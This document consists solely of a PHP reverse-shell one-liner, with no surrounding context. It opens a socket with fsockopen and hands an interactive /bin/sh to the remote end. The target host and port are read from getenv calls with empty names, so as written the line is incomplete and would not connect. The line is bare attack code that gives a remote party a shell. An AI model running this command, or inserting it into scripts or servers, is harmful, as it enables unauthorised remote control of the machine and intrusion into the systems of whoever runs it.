php -r '$sock=fsockopen(getenv(""),getenv(""));exec("/bin/sh -i <&3 >&3 2>&3");'
